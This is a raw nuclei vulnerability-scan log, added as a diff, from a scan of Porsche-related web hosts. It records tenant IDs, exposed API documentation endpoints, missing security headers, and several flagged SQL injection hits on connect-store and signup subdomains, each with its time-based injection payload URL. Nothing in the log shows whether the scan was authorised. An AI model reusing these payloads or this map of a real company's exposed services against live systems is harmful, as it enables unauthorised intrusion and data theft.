@@ -1,0 +1,290 @@
+                                       __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.4.6
+
+		projectdiscovery.io
+
+[WRN] Found 2099 templates loaded with deprecated protocol syntax, update before v3 for continued support.
+[WRN] Found 11 templates with runtime error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.4.6 (outdated)
+[INF] Current nuclei-templates version: v10.2.7 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 55
+[INF] Templates loaded for current scan: 15277
+[INF] Executing 8265 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 7012 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 104
+[INF] Running httpx on input host
+[INF] Found 43 URL from httpx
+[INF] Templates clustered: 6821 (Reduced 777816 Requests)
+[INF] Skipped porsche-essen.de:80 from target list as found unresponsive 30 times
+[INF] Skipped investorrelations.porsche.de:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 33 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porsche.digital/v2.0/.well-known/openid-configuration ["31f1b789-90e3-442a-acd2-d6ae8c8bda31"]
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porschefortcollins.com/v2.0/.well-known/openid-configuration ["88b84952-d6d8-4704-9ad0-8266afb93b9b"]
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porschezentrum-berlin.de/v2.0/.well-known/openid-configuration ["56564e0f-83d3-4b52-92e8-a6bb9ea36564"]
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[tech-detect:google-tag-manager] [http] [info] https://jobs.porsche.com/index.php?ac=start
+[tech-detect:nginx] [http] [info] https://jobs.porsche.com/index.php?ac=start
+[tech-detect:nginx] [http] [info] https://jobs.porsche.com
+[api-exposure-detection] [http] [medium] https://myhistory.porsche.com/api/graphql
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porsche-kempten.de/v2.0/.well-known/openid-configuration ["0769e9e0-7683-4d81-afbc-2a368459ec7b"]
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porsche.de/v2.0/.well-known/openid-configuration ["56564e0f-83d3-4b52-92e8-a6bb9ea36564"]
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porsche.digital/v2.0/.well-known/openid-configuration ["31f1b789-90e3-442a-acd2-d6ae8c8bda31"]
+[cookies-without-httponly-secure] [http] [info] https://myhistory.porsche.com
+[cookies-without-httponly] [http] [info] https://myhistory.porsche.com
+[cookies-without-secure] [http] [info] https://myhistory.porsche.com
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[2024-105171554] [http] [high] https://connect-store.porsche.com/ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:3'--
+[2024-106041130] [http] [high] https://connect-store.porsche.com/portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:3'--+
+[yonyou-nc-complainbilldetail-sqli] [http] [high] https://connect-store.porsche.com/ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'--
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/graphql/
+[INF] Skipped porshe-design.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/v1/graphql
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/swagger/
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/swagger.json
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porschefortcollins.com/v2.0/.well-known/openid-configuration ["88b84952-d6d8-4704-9ad0-8266afb93b9b"]
+[seeyon-fe-ncsubjass-sqli] [http] [critical] https://porsche.com/fenc/ncsubjass.j%73p
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porschezentrum-berlin.de/v2.0/.well-known/openid-configuration ["56564e0f-83d3-4b52-92e8-a6bb9ea36564"]
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/swagger-resources
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/porschezentrum-berlin-sued.de/v2.0/.well-known/openid-configuration ["56564e0f-83d3-4b52-92e8-a6bb9ea36564"]
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/swagger-resources/configuration/ui
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/api-docs/
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/openapi.json
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/docs
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 33 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/api-doc
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/api/documentation
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/developer
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/pzk.de/v2.0/.well-known/openid-configuration ["86f31654-d005-4ecd-b6fb-6785c383ddd9"]
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 37 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[nextjs-cache-poisoning] [http] [high] https://connect-store.porsche.com/poc?__nextDataReq=1
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 35 times
+[api-exposure-detection] [http] [medium] https://connect-store.porsche.com/explorer/
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 33 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/pzm.de/v2.0/.well-known/openid-configuration ["0f6f68be-4ef2-465a-986b-eb9a250d9789"]
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 36 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 33 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[wsdl-user-pwd-change] [http] [medium] https://connect-store.porsche.com/seeyon/services/authorityService?wsdl
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/pzms.de/v2.0/.well-known/openid-configuration ["0f6f68be-4ef2-465a-986b-eb9a250d9789"]
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[composer-config:composer.lock] [http] [info] https://myhistory.porsche.com/composer.lock
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 33 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[composer-config:composer.lock] [http] [info] https://myhistory.porsche.com/vendor/composer/installed.json
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 33 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 35 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[robots-txt-endpoint] [http] [info] https://connect-store.porsche.com/robots.txt
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 33 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 33 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 34 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped pzm.de:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 38 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/pzm.de/v2.0/.well-known/openid-configuration ["0f6f68be-4ef2-465a-986b-eb9a250d9789"]
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 32 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 30 times
+[azure-domain-tenant] [http] [info] https://login.microsoftonline.com:443/pzms.de/v2.0/.well-known/openid-configuration ["0f6f68be-4ef2-465a-986b-eb9a250d9789"]
+[osint-extractor-bitcoin] [http] [info] https://myhistory.porsche.com ["3c2ecd394af7e77bc888a87906"]
+[osint-extractor-emoji] [http] [info] https://myhistory.porsche.com ["5","6","3","8","1","#","9","*","0","2","7","4"]
+[osint-extractor-ipv6] [http] [info] https://myhistory.porsche.com ["1::"]
+[osint-extractor-rg] [http] [info] https://myhistory.porsche.com ["2.1755713","175571379"]
+[osint-extractor-telefone] [http] [info] https://myhistory.porsche.com ["1755713791"]
+[osint-extractor-url] [http] [info] https://myhistory.porsche.com ["http://www.w3.org/2000/svg","https://vercel.link/security-checkpoint"]
+[extract-nickname] [http] [info] https://myhistory.porsche.com ["@keyframes","@media"]
+[extract-possible-phonenumbers] [http] [info] https://myhistory.porsche.com ["205194","+1203247","1820426","324 12 12","498822","653314","12273","342972","0 0 24 24","144 12 12","180 12 12","731591","503603","1482714","514650","2661511","586029","468930","128034","2052916","180567","76884","87906","1461766","+10943","2080962","4143894","1068562","251385","2.1755713791","534687","1687602","228655","497214","2601492","7370908","3119571","168713","72 12 12","8059670","1869736","+296113","252 12 12","27436","108 12 12","+75356","150950","590924","5648965","9905203","36 12 12","288 12 12","633758","221130","1876870","287199","43914","1764051","216 12 12","1755713791-0","38206"]
+[extract-solana-address] [http] [info] https://myhistory.porsche.com ["DhiN2VhZDYyMmM5MGM5Mzk3ZGYwNTU3Mj"]
+[extract-titles] [http] [info] https://myhistory.porsche.com ["<title>Vercel Security Checkpoint</title>"]
+[extract-possible-crypto-addresses] [http] [info] https://myhistory.porsche.com ["prefers-color-scheme","header-noscript-text","q9OHcVuEtJtPZUMsBRPgylHUdHmEzowu","data-astro-cid-jlpqxutv","spinner-circle-animate"]
+[extract-urls] [http] [info] https://myhistory.porsche.com ["http://www.w3.org/2000/svg","https://vercel.link/security-checkpoint"]
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped capitalmarketsday.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped microsite.porsche.com:80 from target list as found unresponsive 31 times
+[INF] Skipped christmas-silence.porsche.com:80 from target list as found unresponsive 30 times
+[INF] Skipped studio-fa-porsche.de:80 from target list as found unresponsive 30 times
+[INF] Skipped studiofaporsche.de:80 from target list as found unresponsive 30 times
+[graylog-endpoints-exposure:unauthorized-graylog-header] [http] [info] https://myhistory.porsche.com/api/plugins/org.graylog.enterprise.integrations/office365/checkSubscriptions
+[api-exposure-detection] [http] [medium] https://porscheenglewood.com/api/v1/graphql
+[api-exposure-detection] [http] [medium] https://skyway.porsche.com/swagger-ui.html
+[api-exposure-detection] [http] [medium] https://skyway.porsche.com/swagger/
+[wanhu-ezoffice-isignaturehtml-documentedit-sqli:mssql] [http] [critical] https://signup.porsche.com/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:5%27--
+[eoffice-v10-leave-record-sqli] [http] [critical] https://signup.porsche.com/eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10
+[http-missing-security-headers:access-control-expose-headers] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-max-age] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:permission-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:x-content-type-options] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:referrer-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:clear-site-data] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-credentials] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-methods] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:content-security-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-origin] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-max-age] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-credentials] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-expose-headers] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-headers] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:content-security-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:permission-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:x-content-type-options] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:referrer-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:clear-site-data] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-origin] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:access-control-allow-methods] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://skyway.porsche.com/public/chooser.html?redirect=%2F
+[http-missing-security-headers:referrer-policy] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:access-control-allow-origin] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:access-control-max-age] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:access-control-allow-methods] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:clear-site-data] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:access-control-allow-credentials] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:access-control-expose-headers] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:permission-policy] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2f
+[http-missing-security-headers:referrer-policy] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:access-control-allow-origin] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:access-control-allow-credentials] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:x-frame-options] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:clear-site-data] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:access-control-expose-headers] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:access-control-max-age] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:access-control-allow-methods] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:content-security-policy] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:x-content-type-options] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:permission-policy] [http] [info] https://skyway.porsche.com
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://skyway.porsche.com
+[2024-105091615] [http] [high] https://signup.porsche.com/u8qx/slbmbygr.jsp?gsdm=1';waitfor+delay+'0:0:3'--&zydm&kjnd
+[2024-105131645] [http] [medium] https://signup.porsche.com/portal/pt/servlet/workflowImageServlet/doPost?pageId=login&wfpk=1&proInsPk=1'waitfor+delay+'0:0:3'--
+[2024-106041130] [http] [high] https://signup.porsche.com/portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:3'--+
+[http-admin-interface] [http] [info] https://signup.porsche.com
+[display-via-header] [http] [info] https://signup.porsche.com ["Via: 1.1 473a7327891bdce42eed5ffe7062b9f6.cloudfront.net (CloudFront)"]
+[api-exposure-detection] [http] [medium] https://signup.porsche.com/graphql/
+[api-exposure-detection] [http] [medium] https://signup.porsche.com/graphql-explorer
+[api-exposure-detection] [http] [medium] https://signup.porsche.com/api/v2/graphql
+[api-exposure-detection] [http] [medium] https://signup.porsche.com/swagger-ui/
+[api-exposure-detection] [http] [medium] https://signup.porsche.com/v2/api-docs
+[graylog-endpoints-exposure] [http] [info] https://skyway.porsche.com/crowd/plugins/servlet/saml-login?redirect=%2fapi%2fplugins%2forg.graylog.plugins.report%2freports
+[INF] Scan completed in 3h57m. 128 matches found.
+
